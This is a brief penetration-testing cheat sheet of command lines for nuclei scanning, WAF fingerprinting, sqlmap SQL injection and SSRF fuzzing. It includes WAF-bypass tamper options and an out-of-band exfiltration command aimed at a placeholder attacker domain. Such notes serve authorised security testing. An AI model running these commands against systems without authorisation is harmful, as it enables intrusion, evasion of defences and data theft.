# Vulnerability Scanning Tools: Configuration & Bypass

## nuclei

### Custom Template Execution
```bash
# Run specific severities
nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high
# Run only custom templates (exclude default)
nuclei -l targets.txt -t ~/custom-templates/ -e ~/nuclei-templates/
# Exclude specific tags
nuclei -l targets.txt -t ~/nuclei-templates/ -etags "dos,fuzz,misc"
```

### Rate Limiting & OPSEC
```bash
nuclei -l targets.txt -t cves/ -rl 50 -c 10 -timeout 5 \
  --max-host-error 20 -headless-options "-disable-gpu"
# -rl: rate limit (req/s), -c: concurrency, --max-host-error: skip after N errors
```

## WAF Detection
```bash
wafw00f https://target.com -a  # Identify WAF vendor
nmap --script http-waf-fingerprint -p 443 target.com
```

## SQL Injection Automation

### sqlmap (Advanced)
```bash
# WAF bypass tamper scripts
sqlmap -r request.txt --tamper=space2comment,randomcase,charencode --random-agent
# Deep testing
sqlmap -r request.txt --level=5 --risk=3 --batch
# OOB exfiltration
sqlmap -r request.txt --dns-domain=attacker.com
# Force DBMS + technique
sqlmap -r request.txt --dbms=mysql --technique=BT
```

## SSRF Detection

### Burp Extension: Collaborator Everywhere
Injects Collaborator URLs into headers and parameters automatically.

### Manual
```bash
ffuf -u https://target.com/api/proxy?url=FUZZ -w ssrf_params.txt -ac
```
